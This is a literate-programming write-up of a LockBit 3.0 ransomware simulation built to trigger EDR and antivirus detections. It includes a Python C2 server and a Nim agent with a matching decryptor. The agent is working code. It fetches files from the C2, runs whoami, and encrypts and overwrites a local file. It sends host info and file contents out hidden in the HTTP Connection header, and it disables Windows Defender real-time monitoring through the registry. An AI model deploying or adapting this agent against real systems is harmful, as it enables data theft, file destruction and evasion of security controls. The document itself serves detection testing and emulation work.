#+TITLE: LockBit 3.0 Simulation 
#+AUTHOR: Russell Brinson
#+DATE: [2023-08-09 Wed]

* Overview 
Creating a simulation of the LockBit 3.0 Ransomware with some of the known indicators of compromise. This is not meant to be malicious at all but hopefully has enough IoCs that are flagged as malware by EDR and AV.

This will be compromised of a very simple listening server in python for the c2 and the simulated malware in nim (please don't write malware in nim).

- [[https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a][#StopRansomware: LockBit 3.0 Cybersecurity Advisory by CISA]]

* Simulated C2 Server
Using the base of the C2 server with my [[https://github.com/rbrins/security-tools/blob/main/betterHttpServer.py][betterHttpServer]], which itself is just a hack of python's standard ~HttpServer~ module.
** Files in Listening Directory
These downloaded files ideally will trigger signature based detections. 
- LockBit 3.0 Black Icon
- NetworkShares.xml
- Services.xml

** HTTP Server listening for specific POST
According to the Cybersecurity Advisory, it looks like the encrypted data is within the ~Connection~ Header.
- Connection: Keep-Alive
- extract encrypted and encoded data
- decode then unencrypt data
*** Imports and Arguments
#+BEGIN_SRC python :tangle simulated-c2-server.py
import http.server
import socketserver
import argparse
import base64

parser = argparse.ArgumentParser(
    prog = "Simulated C2 w/ HttpServer",
    description = "Changed Python's SimpleHTTPServer to receive fake/simulated C2 data")

parser.add_argument('-p', '--port', type=int, metavar="[0-65536]", default=8000)
parser.add_argument('-k', '--key')
parser.add_argument('-i', '--iv')

args = parser.parse_args()

port = args.port
key = args.key
iv = args.iv

def extractData(connectionString):
    return connectionString[148:-166]

#+END_SRC

*** Modified betterHttpServer
sorry this was before I did literate programming, also I wished I had commented and sourced a bit better.

Modifications:
- removed SpecifcHandler
- only does all headers
- added try/except with looking for the "Connection" header
- passing this connection header to another python function to begin pulling information from it
#+BEGIN_SRC python :tangle simulated-c2-server.py
class AllHeadersHandler(http.server.SimpleHTTPRequestHandler):

    def do_GET(self):
        http.server.SimpleHTTPRequestHandler.do_GET(self)

    def do_POST(self):
        try:
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.send_header('Connection', 'Keep-Alive')
            #self.send_header('Keep-Alive', 'timeout=5, max=100')
            self.end_headers()
            #print("[i] Sent the headers")

            if (self.headers.get("Connection")):

               print("[i] Connection: " + self.headers.get("Connection")) # debugging print
               
               encodedEncryptedData = extractData(self.headers.get("Connection"))
               print("[i] Extracted Data: " + encodedEncryptedData)
               
               #decodedEncryptedData = base64.b64decode(encodedEncryptedData)
               #print("[i] Decoded Base64 Type: {}".format(type(decodedEncryptedData)))
               #print("[i] Decoded Encrypted Data: {}".format(decodedEncryptedData))
               
               #plaintext = aes_ctr.AES_CTR_decrypt(key, iv, decodedEncryptedData)
               #print("[+] Decoded Decrypted Data: {}".format(plaintext))
            #print("[i] Sending response body now...")
            
            #self.wfile.write(bytes(message, "utf8"))

        except:
            self.send_response(404)


Handler = AllHeadersHandler

print("Serving HTTP on 0.0.0.0 port {}...".format(port))
httpd = socketserver.TCPServer(("", port), Handler)

httpd.serve_forever()

#+END_SRC



* Simulated Malware
** Commands Needed
- download file
- encrypt file
- send encrypted file contents in HTTP POST body
- attempt registry modification
- send status in HTTP POST body
- if cross compiling from linux then you need mingw installed 
- compile with ~nim compile -d:mingw --app:console simAgent.nim~

** Imported Modules & Global Variables
#+BEGIN_SRC nim :tangle simAgent.nim
import std/[asyncdispatch, httpclient, osproc, os, net, base64, parseopt]
import nimcrypto
import winregistry except open
import strutils

var 
    lockbitIconUrl: string = "picture1_0.jpg"
    networkXmlUrl: string = "NetworkShares.xml"
    servicesXmlUrl: string = "Services.xml"
    
    passedKey: string = "Password12345678"
    passedIV: string = "1234567890ABCDEF"

    file2Encrypt: string = "File2Encrypt.txt"
    
    registryKey: string = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender"
    registryValue: string = "DisableRealtimeMonitoring"
    registryValueData: int32 = 1

    domain: string
    portNumber: int


#+END_SRC

** Argument Parsing
#+BEGIN_SRC nim :tangle simAgent.nim
for kind, key, value in getopt():  

    case kind
    of cmdArgument:
    # echo "Got arg with key: ", key
        echo ("cmdArgument: " & value)
        discard #(should discard this iteration of the loop and move to the next one)

    # cmdLongOption, cmdShortOption: 
    of cmdLongOption, cmdShortOption:
        case key
        of "d", "domain":
            domain = value
        of "p", "portNumber":
            portNumber = parseInt(value)
    of cmdEnd:
        discard # apparently have to do this anyways

let ipAddress: string = domain
let portNum: int = portNumber
var c2URL: string = ("http://" & ipAddress & ":" & $(portNum))

#+END_SRC

** Debugging Helpers
#+BEGIN_SRC nim :tangle simAgent.nim

var debugToggle: bool = true

var error: string = "E"
var info: string = "i"
var success: string = "+"

proc debugMessage(msgType, msg: string, toggle: bool): void = 
    if toggle == true:
        echo ("[" & msgType & "] " & msg)

#+END_SRC

** Download File
#+BEGIN_SRC nim :tangle simAgent.nim

proc asyncProc(file2Download: string): Future[string] {.async.} =
    var client = newAsyncHttpClient()
    try:
      return await client.getContent(file2Download)
    finally:
      client.close()
#+END_SRC

** Get Basic Computer info
#+BEGIN_SRC nim :tangle simAgent.nim
proc getComputerInfo(): string =
    var currentDir = getCurrentDir()
    var whoami = execCmdEx("whoami")
    var data: string = ("{ CurrentDir: " & currentDir & " , Whoami: " & whoami[0] & " }")
    return data
#+END_SRC

** Read & Write File
#+BEGIN_SRC nim :tangle simAgent.nim
proc readFile(fileName: string): string =
    let f = open(fileName)
    defer: f.close()
    let firstLine = f.readLine()
    return firstLine

# writeFile(fileName, text) is a built in proc
#+END_SRC

** Encrypt Data
#+BEGIN_SRC nim :tangle simAgent.nim
proc encryptEncodeStr(plaintext, skey, siv: string): string = 
    var
        enctext = newSeq[byte](len(plaintext))
        dectext = newSeq[byte](len(plaintext))

        ectx: CTR[aes256]
        key: array[aes256.sizeKey, byte]
        iv: array[aes256.sizeBlock, byte]

    copyMem(addr dectext[0], unsafeaddr plaintext[0], len(plaintext))
    copyMem(addr key[0], unsafeaddr skey[0], len(skey))
    copyMem(addr iv[0], unsafeaddr siv[0], len(siv))

    ectx.init(key, iv)
    ectx.encrypt(dectext, enctext)
    ectx.clear

    return encode(enctext)
#+END_SRC

** Send Custom HTTP POST
#+BEGIN_SRC nim :tangle simAgent.nim
proc httpPOST(url, b64Data: string): Future[AsyncResponse] {.async.} =
    var firstPart: string = "Keep-Alive LIWy=RJ51lB5GM&a4OuN=<Lockbit ID>&LoSyE3=8SZ1hdlhzld4&DHnd99T=rTx9xGlInO6X0zWW&2D6=Bokz&T1guL=MtRZsFCRMKyBmfmqI& 6SF3g=JPDt9lfJIQ&wQadZP="
    var lastPart: string = " Xni=AboZOXwUw&2rQnM4=94L&0b=ZfKv7c&NO1d=M2kJlyus&AgbDTb=xwSpba&8sr=EndL4n0HVZjxPR& m4ZhTTH=sBVnPY&xZDiygN=cU1pAwKEztU&=5q55aFIAfTVQWTEm&4sXwVWcyhy=l68FrIdBESIvfCkvYl"

    var smuggled: string = (firstPart & b64Data & lastPart)

    let client = newAsyncHttpClient()
    client.headers = newHttpHeaders({ "Connection": smuggled })
    try:
        return await client.request(url, httpMethod = HttpPost)
        #debugMessage(info, ("Server response :" & response.status), debugToggle)
    finally:
        client.close()
#+END_SRC

** Modify Windows Registry 
- Need the hKey handle to be opened with the KEY_SET_VALUE access rights
- pinvoke for RegCreateKeyA https://www.pinvoke.net/default.aspx/advapi32/RegCreateKeyEx.html
- pinvoke for RegSetValueEx https://www.pinvoke.net/default.aspx/advapi32/RegSetValueEx.html 
- win32 API docs for RegCreateKeyExA https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regcreatekeyexa
- win32 API docs for RegSetValueExA https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regsetvalueexa
- win32 registry key security and access rights - https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights
- System Error Codes https://learn.microsoft.com/en-us/windows/win32/debug/system-error-codes--0-499-
  - a return of ~0~ is the ~ERROR_SUCCESS~
  - returning an int from each function

- using https://github.com/miere43/nim-registry/blob/devel/winregistry.nim

** Executing the Steps in Order
1. Download Icon
2. Download NetworkShares.xml
3. Download Services.xml
4. Sends User and Computer Name back to C2 via Connection header
5. Open and read file contents into variable
6. Encrypts file
7. Sends file contents back to C2 via Connection header
8. Disable Real-Time Protectio via Registry
9. Sends test completed back to C2 via Connection header

*** Steps 1 - 3
#+BEGIN_SRC nim :tangle simAgent.nim
echo "[+] Starting simAgent"
echo ("[i] Connecting to c2 URL: " & c2URL)

# Steps 1-3
echo "######################################################"
echo "#                Steps 1-3                           #"
echo "######################################################"

#debugMessage(info, "Starting LockBit 3.0 Icon Download", debugToggle)
var lockbitIcon: string = waitFor asyncProc((c2URL & "/" & lockbitIconUrl))
writeFile(lockbitIconUrl, lockbitIcon)
debugMessage(success, "LockBit 3.0 Icon Downloaded and Written", debugToggle)

#debugMessage(info, "Starting NetworkShares.xml Download", debugToggle)
var networkXml: string = waitFor asyncProc((c2URL & "/" & networkXmlUrl))
writeFile(networkXmlUrl, networkXml)
debugMessage(success, "NetworkShares.xml Downloaded and Written", debugToggle)

#debugMessage(info, "Starting Services.xml Download", debugToggle)
var servicesXml: string =  waitFor asyncProc((c2URL & "/" & servicesXmlUrl))
writeFile(servicesXmlUrl, servicesXml)
debugMessage(success, "Services.xml Downloaded and Written", debugToggle)

#+END_SRC


*** Steps 4 - 7
#+BEGIN_SRC nim :tangle simAgent.nim

# Steps 4-7
echo "######################################################"
echo "#                Steps 4-7                           #"
echo "######################################################"
sleep(2000)

#debugMessage(info, "Starting getComputerInfo()", debugToggle)
var compInfo: string = getComputerInfo()
debugMessage(success, ("getComputerInfo(): " & compInfo), debugToggle) 

#debugMessage(info, "Starting encryption and b64 of compInfo", debugToggle)
var encCompInfo: string = encryptEncodeStr(compInfo, passedKey, passedIV)
debugMessage(success, ("Encrypted and b64 of compInfo: " & encCompInfo), debugToggle)

#debugMessage(info, "Starting encoding of encryptedInfo", debugToggle)
#var encodedCompInfo: string = encode(encryptedInfo)
#debugMessage(success, "Encoded of encryptedInfo completed", debugToggle)

debugMessage(info, "Starting HTTP POST of encodedCompInfo", debugToggle)
var compInfoPostResponse = waitFor httpPOST(c2URL, encCompInfo)
debugMessage(success, "HTTP POST of encodedCompInfo successful", debugToggle)

sleep(2000)

debugMessage(info, ("Starting readFile " & file2Encrypt), debugToggle)
var fileContents: string = readFile(file2Encrypt)
debugMessage(success, "readFile contents completed", debugToggle)

debugMessage(info, "Starting encryption of read-in memory data", debugToggle)
var encFileData: string = encryptEncodeStr(fileContents, passedKey, passedIV)
debugMessage(success, "Encryption of read-in memory data complete", debugToggle)

#debugMessage(info, "Starting encoding of read-in memory data", debugToggle)
#var encodedData: string = encode(encryptedData)
#debugMessage(success, "Encoded of read-in memory data complete", debugToggle)

debugMessage(info, "Starting over-write of file contents with encrypted data", debugToggle)
writeFile(file2Encrypt, encFileData)
debugMessage(success, "Over-write of file contents completed", debugToggle)

sleep(2000)

debugMessage(info, "Starting HTTP POST of encoded read-in data", debugToggle)
var filePostResponse = waitFor httpPOST(c2URL, encFileData)
debugMessage(success, "HTTP POST of encodedData successful", debugToggle)

sleep(2000)
#+END_SRC

*** Steps 8 and 9
#+BEGIN_SRC nim :tangle simAgent.nim

# Step 8
echo "######################################################"
echo "#                Steps 8                             #"
echo "######################################################"

debugMessage(info, ("Opening registry key " & registryKey), debugToggle)
var h: RegHandle = createOrOpen(registryKey, samWrite)
debugMessage(success, "Opening key successful", debugToggle)

debugMessage(info, "Writing to registry key", debugToggle)
writeInt32(h, registryValue, registryValueData)
debugMessage(success, "Writing registry key successful", debugToggle)

# Step 9
echo "######################################################"
echo "#                Steps 9                             #"
echo "######################################################"
debugMessage(info, "Starting final HTTP POST", debugToggle)
discard waitFor httpPOST(c2URL, encryptEncodeStr("Completed", passedKey, passedIV))
sleep(5000)
echo "[+] Malware Simulation Completed"
#+END_SRC




* Decryptor on C2 Server
Due to limitations on Nim's cryptography library using AES CTR with IVs and Python's PyCryptodome library using AES CTR with nonce's. This is a decryptor written in Nim using the same library as the encryption.

** Imports and Global Variables
#+BEGIN_SRC nim :tangle c2Decrypt.nim
import nimcrypto
import base64
import std/parseopt

var
    skey: string = "Password12345678"
    siv: string = "1234567890ABCDEF"

    b64encData: string

# CLI Arguments for the Server
#  in nim argument values must be passed with = or :
for kind, key, value in getopt():  

    case kind
    of cmdArgument:
    # echo "Got arg with key: ", key
        echo ("cmdArgument: " & value)
        discard #(should discard this iteration of the loop and move to the next one)

    # cmdLongOption, cmdShortOption: 
    of cmdLongOption, cmdShortOption:
        case key
        of "b", "base64-string":
            b64encData = value
    of cmdEnd:
        discard # apparently have to do this anyways

#+END_SRC

** Encrypt and return base64 data
#+BEGIN_SRC nim :tangle c2Decrypt.nim
proc base64Encrypt(skey, siv, plaintext: string): string =
    var
        enctext = newSeq[byte](len(plaintext))
        dectext = newSeq[byte](len(plaintext))

        ectx: CTR[aes256]
        key: array[aes256.sizeKey, byte]
        iv: array[aes256.sizeBlock, byte]

    copyMem(addr dectext[0], unsafeaddr plaintext[0], len(plaintext))
    copyMem(addr key[0], unsafeaddr skey[0], len(skey))
    copyMem(addr iv[0], unsafeaddr siv[0], len(siv))

    ectx.init(key, iv)
    ectx.encrypt(dectext, enctext)
    ectx.clear()

    return encode(enctext)
#+END_SRC

** Decrypt base64 data
#+BEGIN_SRC nim :tangle c2Decrypt.nim

func toByteSeq(str: string): seq[byte] {.inline.} =
    ## Converts a string to the corresponding byte sequence.
    @(str.toOpenArrayByte(0, str.high))

proc decryptBase64*(skey, siv, b64data: string): string = 
    var
        data = toByteSeq(decode(b64data))
        decdata = newSeq[byte](len(data))
        encdata = newSeq[byte](len(data))

        plaintext = newString(len(decdata))

        dctx: CTR[aes256]
        key: array[aes256.sizeKey, byte]
        iv: array[aes256.sizeBlock, byte]

    copyMem(addr encdata[0], unsafeaddr data[0], len(data))
    copyMem(addr key[0], unsafeaddr skey[0], len(skey))
    copyMem(addr iv[0], unsafeaddr siv[0], len(siv))

    dctx.init(key, iv)
    dctx.decrypt(encdata, decdata)
    dctx.clear()

    copyMem(addr plaintext[0], addr decdata[0], len(decdata))

    #echo "IV:                   ", toHex(iv)
    #echo "Decrypted (Hex):      ", toHex(plaintext)
    #echo "Plain Text:           ", plaintext
    #echo "Encrypted text:       ", encText
    return plaintext

#+END_SRC

** Testing decryption
#+BEGIN_SRC nim :tangle c2Decrypt.nim

echo ("Base64 encoded encrypted Data: " & b64encData)

#var encryptedData: string = base64Encrypt(skey, siv, myData)

#echo ("Encrypted Data: " & encryptedData)
echo ("Decrypted Data:                " & decryptBase64(skey, siv, b64encData))

#+END_SRC
